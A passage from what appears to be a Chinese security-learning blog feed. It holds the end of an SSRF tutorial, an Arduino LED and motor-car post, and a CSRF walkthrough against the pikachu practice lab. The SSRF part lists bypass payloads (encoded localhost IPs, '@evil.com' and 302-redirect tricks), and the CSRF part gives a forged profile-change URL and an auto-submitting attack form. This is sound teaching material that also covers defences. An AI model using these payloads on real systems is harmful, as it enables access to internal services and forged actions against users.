href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><ol start="2"><li>dnslog等工具进行测试，看是否被访问</li></ol><p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p><ol start="3"><li>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</li></ol><p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>–通过二级域名暴力猜解工具模糊猜测内网地址</p><ol start="4"><li>直接返回的Banner、title、content等信息</li><li>留意bool型SSRF</li></ol><h2 id="SSRF绕过姿势"><a href="#SSRF绕过姿势" class="headerlink" title="SSRF绕过姿势"></a>SSRF绕过姿势</h2><blockquote><p>更多见 <a href="https://www.secpulse.com/archives/65832.html">SSRF绕过方法总结</a> 、参考资料[3]</p></blockquote><ol><li><p>进制的转换绕过内网IP</p><p>可以使用一些不同的进制替代ip地址，从而绕过WAF。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如 127.0.0.1</span><br><span class="line">8进制：0177.0.0.1</span><br><span class="line">16进制：0x7f.0.0.1</span><br><span class="line">10进制：2130706433</span><br></pre></td></tr></table></figure><p>其他各种指向127.0.0.1的地址</p><blockquote><p><a href="http://localhost/">http://localhost/</a>         # localhost就是代指127.0.0.1</p><p><a href="http://0.0.0.0/">http://0/</a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</p><p><a href="http://0.0.0.0/">http://0.0.0.0/</a>       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</p><p>http://[::]:80/           # 在liunx下可用，window测试了下不行</p><p><a href="http://127.0.0.1/">http://127。0。0。1/</a>       # 用中文句号绕过</p><p>http://①②⑦.⓪.⓪.①</p><p><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p></blockquote></li><li><p>利用HTTP基本身份认证的方式绕过</p><p>如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com/">http://www.xxx.com</a> ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p></li><li><p>利用302跳转绕过内网IP</p></li></ol><p>（1）网络上存在一个很神奇的服务，网址为 <a href="http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</a></p><p>当我们访问：<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> 时，实际上访问的是<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> 。像这种网址还有<a href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a> 。</p><p>如下示例（flag.php仅能从本地访问）：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203614705.png" alt="image-20210401203614705"></p><p>（2）短地址跳转绕过，这里也给出一个网址 <a href="https://4m.cn/%EF%BC%9A">https://4m.cn/：</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203936903.png" alt="image-20210401203936903"></p><p>直接使用生成的短连接 <a href="https://4m.cn/FjOdQ%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8302%E8%B7%B3%E8%BD%AC%E5%88%B0">https://4m.cn/FjOdQ就会自动302跳转到</a> <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 上，这样就可以绕过WAF了：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401204144651.png" alt="image-20210401204144651"></p><h1 id="SSRF漏洞常用防御方法"><a href="#SSRF漏洞常用防御方法" class="headerlink" title="SSRF漏洞常用防御方法"></a>SSRF漏洞常用防御方法</h1><p>通过上面的知道了SSRF漏洞最大的成因是URL完全可控，服务器会对用户构造的URL进行响应，所以从防御方面来看我们要禁止服务器随意响应用户构造的URL。</p><ol><li>过滤。过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>禁止跳转。防止用户利用服务器做跳板机</li><li>禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。</li><li>限制端口。只开放常用端口</li><li>统一返回的错误信息。这样用户就不可以根据返回信息判断端口情况。</li><li>使用DNS缓存技术防止DNS解析攻击</li><li>使用正则防止畸形绕过</li></ol><h1 id="XSS-CSRF-SSRF异同"><a href="#XSS-CSRF-SSRF异同" class="headerlink" title="XSS,CSRF,SSRF异同"></a>XSS,CSRF,SSRF异同</h1><p>XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p><p>不同点：</p><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的 脚本语句被执行。</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 利用用户的Cookie信息伪造用户请求发送至服务器。</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>SSRF是服务器对 用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/91819069">SSRF漏洞攻击原理及防御方案</a></p><p>[2] <a href="https://xz.aliyun.com/t/2115?accounttraceid=941294f62118431d9627281481dc0f3bngye#toc-5">了解SSRF,这一篇就足够了</a></p><p>[3] <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247495875&idx=1&sn=5c25babaff728cc8498dced8f56a5bf1&chksm=ec1ca5fcdb6b2cea98cc125cee654d9d6426dabcc1ab8a6d466b7fc140ae8bfb59d63f473b9b&mpshare=1&scene=23&srcid=0401sfQC8XjENqPmXz5WNZZ8&sharer_sharetime=1617266425319&sharer_shareid=0682904b850da48c54cd507e190afd60#rd">干货 | SSRF漏洞利用总结</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduino试玩体验</title>
      <link href="posts/5548.html"/>
      <url>posts/5548.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>前几天，幸运地得到了学长赠送的一组 Arduino 套件，好学（玩）的我自然是激动万分。于是开始了 Arduino入坑之旅。现就初次学习（试玩）大体情况作如下记录。</p></div><h1 id="Ariuino-套件"><a href="#Ariuino-套件" class="headerlink" title="Ariuino 套件"></a>Ariuino 套件</h1><p>此套件主要包含有 Arduino UNO板子、驱动模块（L298N）、小车套件、杜邦线、面包板、各种传感器等等。（第一次接触这些，已经被我翻得混乱不堪）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328162824003.png" alt="image-20210328162824003"></p><h1 id="点灯💡"><a href="#点灯💡" class="headerlink" title="点灯💡"></a>点灯💡</h1><p>经过一番学习后，大概了解了这些东西各自的作用。马上开始了第一个（最简单的）尝试，点亮 LED 灯，效果还可以，灯亮了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328163509247.png" alt="image-20210328163509247"></p><p>实现代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="built_in">pinMode</span>(<span class="number">13</span>, <span class="literal">OUTPUT</span>); <span class="comment">//将13号引脚设置为输出状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>); <span class="comment">//高电平</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>); <span class="comment">//低电平</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="流水灯✨"><a href="#流水灯✨" class="headerlink" title="流水灯✨"></a>流水灯✨</h1><p>第二个做的是流水灯，因为只有6个LED小灯，做得比较简单，6个灯在面包板上依次亮灭，也还可以。还学习到了面包板的使用。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/d_lamp.gif"></p><p>实现代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">8</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">  <span class="built_in">pinMode</span>(i, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> interval = <span class="number">100</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="智能小车🚗"><a href="#智能小车🚗" class="headerlink" title="智能小车🚗"></a>智能小车🚗</h1><p>以前做过的小车是马达加上轮子就能跑了，不过只能是以最大速度直行。可有了uno板后就完全不一样了，它可是有强大的CPU在身，能实现转向、变速、控制、循迹等等更加智能的操作。因为没有相应控制模块，这次的目标是让小车前后左右跑起来就行了。可惜没能成功，太失败了吧。以下是最简陋的小车。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328170432868.png" alt="image-20210328170432868"></p><p>测试代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="comment">//定义五中运动状态</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOP      0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FORWARD   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKWARD  2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNLEFT  3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNRIGHT 4</span></span><br><span class="line"><span class="comment">//定义需要用到的引脚</span></span><br><span class="line"><span class="keyword">int</span> leftMotor1 = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> leftMotor2 = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor1 = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor2 = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="comment">//设置控制电机的引脚为输出状态</span></span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(leftMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor1, <span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="built_in">pinMode</span>(rightMotor2, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="keyword">int</span> cmd;</span><br><span class="line">  <span class="keyword">for</span>(cmd=<span class="number">0</span>;cmd&lt;<span class="number">5</span>;cmd++)<span class="comment">//依次执行向前、向后、向左、想有、停止四个运动状态</span></span><br><span class="line">  &#123;</span><br><span class="line">    motorRun(cmd);  </span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//每个命令执行2s </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运动控制函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">motorRun</span><span class="params">(<span class="keyword">int</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">    <span class="keyword">case</span> FORWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> BACKWARD:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNLEFT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> TURNRIGHT:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">HIGH</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(leftMotor2, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor1, <span class="literal">LOW</span>);</span><br><span class="line">      <span class="built_in">digitalWrite</span>(rightMotor2, <span class="literal">LOW</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p>经过我粗浅的分析，小车的代码和连接应该没有问题，问过学长后认为可能是那个电机的问题（毕竟放了几年，放坏了？）</p><p>等过几天买的新套件到了再战，这次就这么告一段落了。车还没动起来，就翻车了，还是太菜了。</p></div>]]></content>
      
      
      <categories>
          
          <category> Arduino </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF“苏醒的巨人”</title>
      <link href="posts/33839.html"/>
      <url>posts/33839.html</url>
      
        <content type="html"><![CDATA[<h1 id="小场面"><a href="#小场面" class="headerlink" title="小场面"></a>小场面</h1><ol><li>场景一：我点击了一个好友转发的qq空间消息，怎么莫名其妙自己也转发了？？？</li><li>场景二：我点击了一个不可描述的网页，然后自己的账号做了一些不可描述的操作？？？</li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lengjing.jpg"></p><h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p>上面两个场面其实就是利用了 CSRF（Cross Site Request Forgery），即跨站请求伪造。攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。可以这么理解：攻击者盗用了你的身份，以你的名义进行某些不可描述的操作。</p><p>想象一下，它可以以你的名义发邮件、发消息、转账、修改密码、删除文章/留言/评论…….属实可恶！</p><p>CSRF 与 XSS 相比，虽然 CSRF 攻击不太流行，但却更加难以防范，所以被认为 CSRF 比 XSS 更具危险性，CSRF 在业内具有“苏醒的巨人”的称号。</p><h1 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/20171009075751481.png"></p><p>一般来说，用户完成以下两个操作，就有可能遭受CSRF攻击。</p><ol><li>登录信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ol><h1 id="CSRF测试"><a href="#CSRF测试" class="headerlink" title="CSRF测试"></a>CSRF测试</h1><blockquote><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu漏洞练习平台</a>之CSRF</p></blockquote><h2 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h2><p>​    ① 用户甲登录信任网站，查看个人信息。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323205127914.png" alt="image-20210323205127914"></p><p>​    ② 攻击者构造恶意的链接，并将其发送给用户甲。</p><p>通过抓包可见，修改个人信息后提交的请求方法是GET。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323211923048.png" alt="image-20210323211923048"></p><p>URL里面的四个参数都可以被修改，直接构造URL为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.66&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;x&amp;phonenum&#x3D;000000&amp;add&#x3D;Mars&amp;email&#x3D;123@123.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure><p>​    ③ 攻击者通过社工等手段引诱用户甲点击这个链接。如果用户甲此时登录状态或cookie/session没有过期，则他的信息就被修改了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323212754122.png" alt="image-20210323212754122"></p><p>可以看到，个人信息内容按照恶意链接的设置被修改了，而用户甲仅点击了那个不明链接。</p><h2 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h2><p>​    ① 同样，用户乙登录了他信任的网站，一切正常。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213429091.png" alt="image-20210323213429091"></p><p>​    ② 攻击者构造恶意的链接，并将其发送给用户乙。</p><p>抓包可见这次的请求方式是POST，URL不再显示修改参数，所以无法再使用上述办法（即通过URL来伪造请求）进行修改。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213939444.png" alt="image-20210323213939444"></p><p>但可以自行创建一个恶意表单，让用户点击这个表单的URL，通过此表单向存在CSRF漏洞的页面去提交POST请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf_post<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    ③ 用户乙点击了这个恶意表单的链接后，其个人信息被修改。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323215151210.png" alt="image-20210323215151210"></p><h1 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h1><p>​    ① 尽量使用POST</p><p>GET接口太容易被拿来做CSRF攻击，接口最好限制为POST使用，降低攻击风险。</p><p>当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p><p>​    ② 二次验证</p><p>在通常情况下，验证码能很好遏制CSRF攻击。当用户收到验证码提示后，可能会心存怀疑，就不会乖乖中招。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。</p><p>​    ③ Referer Check</p><p>Referer Check在Web最常见的应用就是“防止图片盗链”。同理，Referer 